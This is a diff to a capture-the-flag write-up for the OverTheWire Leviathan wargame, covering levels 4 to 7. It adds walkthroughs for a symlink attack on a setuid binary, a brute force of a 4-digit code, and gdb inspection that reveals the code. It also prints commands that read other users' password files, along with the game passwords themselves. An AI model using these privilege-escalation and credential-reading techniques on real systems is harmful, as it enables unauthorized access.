@@ -289,7 +289,7 @@ $ ./bin
 01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
 ```
 
-Odd. The `bin` program seems be display *something* though to the untrained eye it may not mean very much.
+Odd. The `bin` program seems be displaying *something* though to the untrained eye it may not mean very much.
 If you immediately recognize this output as binary encoded data, great! You're correct!
 But what data could it be encoding?
 A password? The name of some other file that contains a password? Some sort of hint?
@@ -302,7 +302,8 @@ $ ltrace ./bin
 # +++ exited (status 255) +++
 ```
 
-From the `ltrace` ourput we can see that the `bin` program appears to be open a file from which to read (`fopen` with the `r` flag): `/etc/leviathan_pass/leviathan5`.
+From the `ltrace` ourput we can see that the `bin` program appears to be opening a file from which to read (`fopen` with the `r` flag):
+ `/etc/leviathan_pass/leviathan5`.
 Unsurprisingly, we don't have permission to read the file.
 
 ```bash
@@ -379,12 +380,12 @@ Did we need to know all of this?
 Not really. You may have seen the output from `bin`, recognized that it was binary
     (heck, maybe you can read binary as if its normal english, in which case you were probably done in a matter of seconds!)
     converted it to ASCII (assuming it was the password),
-    and Bob's your uncle.  
+    and Bob's your uncle.
 But isn't it more fun to *really understand* what is going on? I think so.
 
 This has been an interesting challenge because we didn't see a call to `setuid` in the executable itself.
 Observing such a call in the `ltrace` output surely would have alerted us to the fact that the executable was running with elevated privileges
-    and that the file read would surely succeed, and therefore `bin`'s output surely is related to the password.  
+    and that the file read would surely succeed, and therefore `bin`'s output surely is related to the password.
 Rather, the file permissions were set in such a way that, when the executable was run, it executed with elevated privileges.
 And we got to use our knowledge of file permissions to figure all that out!
 
@@ -397,22 +398,301 @@ If you are curious (or rusty) and want to learn more, [here is a brief tutorial 
 ssh leviathan5@leviathan.labs.overthewire.org -p 2223 #password=Tith4cokei
 ```
 
-*Coming soon...*
+Upon logging in we can see that there is a `leviathan5` binary right in the home directory.
+Run it and see what it does.
+
+```bash
+$ ls
+leviathan5
+$ ./leviathan5
+Cannot find /tmp/file.log
+```
+
+The binary seems to be looking for a file `/tmp/file.log` that doesn't exist.
+Sure enough, we can verify this:
+
+```bash
+$ ls -al /tmp/file.log
+ls: cannot access /tmp/file.log: No such file or directory
+```
+
+Let us turn to `ltrace` once more to try to learn a little more.
+
+```bash
+$ ltrace ./leviathan5
+# __libc_start_main(0x80485ed, 1, 0xffffd7d4, 0x8048690 <unfinished ...>
+# fopen("/tmp/file.log", "r")                                                                                                                                                      = 0
+# puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+# )                                                                                                                                                = 26
+# exit(-1 <no return ...>
+# +++ exited (status 255) +++
+```
+
+Ok, so the executable opens a file for reading, but the file doesn't exist.
+How could we use this to get to the next level?
+Well, how about we try creating a symbolic link to the leviathan6 password file!
+After creating such a link and re-running the `leviathan5` binary,
+    we see that it reads the tmp file and renders the password for the next level!
+
+```bash
+$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+$ ./leviathan5
+UgaoFee4li
+```
+
+NOTE: After creating the link to leviathan6's password file, run `leviathan5` *without* `ltrace`.
+I'm not exactly sure why this is the case, but the linked file can't be opened when `leviathan5` is run by `ltrace`.
+I'm sure there is some nuance with permissions at play here but I haven't dedicated enough cycles to thinking though this thoroughly just yet...
+And I'd rather go play the next levels so I probably won't do so for now :D
+
+<!-- TODO: Why does the read not succeed when leviathan5 is run by ltrace? -->
 
 # Level 6
 
 ```bash
 #login
-ssh leviathan6@leviathan.labs.overthewire.org -p 2223 #password=
+ssh leviathan6@leviathan.labs.overthewire.org -p 2223 #password=UgaoFee4li
 ```
 
-*Coming soon...*
+```bash
+$ ls -al leviathan6
+-r-sr-x--- 1 leviathan7 leviathan6 7492 Oct 30 04:16 leviathan6
+```
+
+```bash
+$ ./leviathan6
+usage: ./leviathan6 <4 digit code>
+```
+
+### Brute-force approach
+
+A program that expects a 4-digit code just screams "brute force me"!
+So we can try this approach.
+
+As in one of the [Bandit challenges](https://traviswp.github.io/bandit.html#level-25),
+    we can put together a concise brute-force pipeline.
+Our pipeline will construct all possibilities of 4-digit codes using bash expansions.
+For example, `{0..9}` expands to 0, 1, 2, ..., 9.
+Thus, by chaining expansions together, we can easily construct all possible permutations of a 4-digit code where each digit takes on a value between 0-9.
+All of this is piped to `xargs` taking at most one argument (one of the 4-digit code guesses) and using that as input to `leviathan6`.
+
+If this is a little confusing,
+    try running parts of the pipeline alone or experimenting with smaller 4-digt code sets (e.g., `echo 000{0..9}`) to see this in action.
+
+```bash
+echo {0..9}{0..9}{0..9}{0..9} | xargs -n 1 ./leviathan6
+```
+
+**WARNING:**
+This maybe isn't the best approach... it turns out that `leviathan6` only outputs "Wrong" when our guess is indeed wrong.
+When we succeed, `leviathan6` drops us into a shell with an effective UID of leviathan7 - there is no text output.
+I caught onto this when I redirected the output from running `leviathan6` to a file.
+I expected to get a file with 10,000 lines (there are 10,000 combinations that exist for a 4-digit code).
+The file, however, was only 9,999 lines long!
+Which told me that, on the one guess that succeeded, no output was rendered.
+
+Verify this for yourself:
+
+```bash
+$ echo {0..9}{0..9}{0..9}{0..9} | xargs -n 1 ./leviathan6 >> out.text
+$ wc -l out.txt
+9999 out.txt
+```
+
+We can be more clever and craft our output by writing a little script that does something similar to our pipeline.
+Here, I've created a script (`crack.sh`) that prints which 4-digit code it is testing and then invokes the `leviathan6` executable.
+I also added a small sleep because (I think) the script tries to run *fast* so it forks new children before others have finished,
+    which led to me hitting my fork limit on the bandit servers.
+By sleeping after invoking `leviathan6`, it gives the child process a little time to complete.
+While this makes the script run slower, we can still try all 10,000 guesses in a relatively short amount of time.
+I'm sure there are other workarounds but this was quick and dirty and easy.
+
+
+```bash
+#!/bin/bash
+for i in $(seq -f "%04g" 0000 9999)
+do
+    echo "Testing: $i"
+    ./leviathan6 "$i"
+    sleep [SOME SMALL AMOUNT OF TIME]
+done
+```
+
+After our script finishes, we have a file with all of our guesses and the result.
+The format of the file is: 
+
+```
+Testing: 0000
+Wrong
+Testing: 0001
+Wrong
+Testing: 0002
+Wrong
+...
+```
+
+and so on and so forth. 
+
+Thus, if we pipe the output of our file to `paste` (which can merge corresponding lines), 
+    then we will get a single line that says "Testing: GUESS Wrong" on all lines except one:
+    the line where there is no "Wrong" output. 
+In this case, we get a line that reads "Testing: GUESS Testing: NEXT-GUESS"
+While this is kind of hacky, 
+    we can then just run an inverted `grep` (i.e., using the `-v` flag) to look for lines that do *not* contain the word "Wrong" on them to find the guess that was correct. 
+Sure enough:
+
+```bash
+$ cat test.txt  | paste -d ' ' - - | grep -v "Wrong"
+Testing: 7123 Testing: 7124
+```
+
+Now we can try `7123` with confidence that this is the expected 4-digit code. 
+
+Next, I'll describe an alternative approach that exercises a bit more finesse. 
+
+### Binary inspection approach
+
+An alternative approach is to go in and examine the executable using tools that can give us insight into how the code runs and what values are used in the execution of the program. 
+
+Let's start by running the `leviathan6` executable with `ltrace`. 
+Be sure to invoke with a 4-digit code guess to exercise a more interesting code path. 
+
+```bash
+$ ltrace ./leviathan6 1234
+__libc_start_main(0x804850d, 2, 0xffffd7c4, 0x8048590 <unfinished ...>
+atoi(0xffffd8f9, 0xffffd7c4, 0xffffd7d0, 0xf7e5519d)                                                                                                                             = 1234
+puts("Wrong"Wrong
+)                                                                                                                                                                    = 6
++++ exited (status 6) +++
+```
+
+We see things like `atoi` being called. 
+It must be the case that `atoi` is called to convert our guess to an integer value which is subsequently compared to the value of the expected 4-digit code. 
+Perhaps we can learn what this value is by examining the comparison that takes place as the program exectures. 
+
+For this, let's turn to `gdb` to get a closer look at what is happening under the hood. 
+We'll start by invoking `gdb` with the `leviathan6` executable. 
+(The `-q` flag simply suppresses the annoying banner information).
+We can then use `disas main` to disassemble the main function in the executable and see what it is doing.
+A high-level look shows us that various functions are called: `printf`, `exit`, `atoi`, `seteuid`, etc (note: these are the lines with the `call` instruction). 
+
+```
+$ gdb -q leviathan6 
+Reading symbols from leviathan6...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804850d <+0>:     push   %ebp
+   0x0804850e <+1>:     mov    %esp,%ebp
+   0x08048510 <+3>:     and    $0xfffffff0,%esp
+   0x08048513 <+6>:     sub    $0x20,%esp
+   0x08048516 <+9>:     movl   $0x1bd3,0x1c(%esp)
+   0x0804851e <+17>:    cmpl   $0x2,0x8(%ebp)
+   0x08048522 <+21>:    je     0x8048545 <main+56>
+   0x08048524 <+23>:    mov    0xc(%ebp),%eax
+   0x08048527 <+26>:    mov    (%eax),%eax
+   0x08048529 <+28>:    mov    %eax,0x4(%esp)
+   0x0804852d <+32>:    movl   $0x8048620,(%esp)
+   0x08048534 <+39>:    call   0x8048390 <printf@plt>
+   0x08048539 <+44>:    movl   $0xffffffff,(%esp)
+   0x08048540 <+51>:    call   0x80483e0 <exit@plt>
+   0x08048545 <+56>:    mov    0xc(%ebp),%eax
+   0x08048548 <+59>:    add    $0x4,%eax
+   0x0804854b <+62>:    mov    (%eax),%eax
+   0x0804854d <+64>:    mov    %eax,(%esp)
+   0x08048550 <+67>:    call   0x8048400 <atoi@plt>
+   0x08048555 <+72>:    cmp    0x1c(%esp),%eax
+   0x08048559 <+76>:    jne    0x8048575 <main+104>
+   0x0804855b <+78>:    movl   $0x3ef,(%esp)
+   0x08048562 <+85>:    call   0x80483a0 <seteuid@plt>
+   0x08048567 <+90>:    movl   $0x804863a,(%esp)
+   0x0804856e <+97>:    call   0x80483c0 <system@plt>
+   0x08048573 <+102>:   jmp    0x8048581 <main+116>
+   0x08048575 <+104>:   movl   $0x8048642,(%esp)
+   0x0804857c <+111>:   call   0x80483b0 <puts@plt>
+   0x08048581 <+116>:   leave
+   0x08048582 <+117>:   ret
+End of assembler dump.
+```
+
+We are most interested in code concerned with `atoi` and subsequent comparisons. 
+Sure enough, right after the line where `atoi` is called, there is a comparison (see the `cmp` instruction?). 
+At that point, the contents of the `%eax` register are compared with some value that is offset from the stack pointer. 
+We can examine all of this by setting a break point at the line where the comparison happens. 
+Note that to set such a break point we use the name of the function (`main`) and the specified offset (`+72`). 
+
+We can then run the program and it will hit our break point, allowing us to examine registers and stack contents. 
+
+```bash
+(gdb) b *main+72
+Breakpoint 1 at 0x8048555
+(gdb) run 1212
+Starting program: /home/leviathan6/leviathan6 1212
+
+Breakpoint 1, 0x08048555 in main ()
+```
+
+Great, now onto our examination. 
+While we don't *need* all the information, I like to see *all* of the registers. 
+The comparison we identified above leads me to believe we are only interested in the `eax` and `esp` registers. 
+In `eax` we see the value we input to the program, `1212`. 
+In `esp` we see an address. 
+
+```bash
+(gdb) info registers
+eax            0x4bc    1212
+ecx            0x0  0
+edx            0xffffd8dc   -10020
+ebx            0xf7fcc000   -134430720
+esp            0xffffd6d0   0xffffd6d0
+ebp            0xffffd6f8   0xffffd6f8
+esi            0x0  0
+edi            0x0  0
+eip            0x8048555    0x8048555 <main+72>
+eflags         0x286    [ PF SF IF ]
+cs             0x23 35
+ss             0x2b 43
+ds             0x2b 43
+es             0x2b 43
+fs             0x0  0
+gs             0x63 99
+```
+
+In the comparison we are inspecting, we are interested in some offset from this address`esp` - specifically, `$esp+0x1c` - not just `esp` itself. 
+This must be where the value lives which is compared to our guess. 
+
+We can directly address `esp` by using the address `0xffffd6d0` or use the variable `$esp`. 
+I'll use the latter here, but either way works. 
+If we examine the memory contents at that address we see: 
+
+```bash
+(gdb) print *((int)$esp+0x1c)
+$1 = 7123
+```
+
+All we've done here is identify the memory address we are interested in, cast it to an `int` (i.e., interpret the contents at this address as an integer), and dereference it. 
+As a result we see the value `7123`. 
+
+### Finishing the level
+
+Regardless of how we get there (brute-force vs. binary inspection vs. something else), we've got a 4-digit code which we believe to be correct.
+Let's try it...
+
+
+```bash
+$ ./leviathan6 7123
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+```
+
+Sure enough, we were dropped into a new shell. 
+Assuming that we have obtained elevated privileges (you can verify for yourself), we can read leviathan7's password file. 
+Done!
 
 # Level 7
 
 ```bash
 #login
-ssh leviathan7@leviathan.labs.overthewire.org -p 2223 #password=
+ssh leviathan7@leviathan.labs.overthewire.org -p 2223 #password=ahy7MaeBo9
 ```
 
 *Coming soon...*
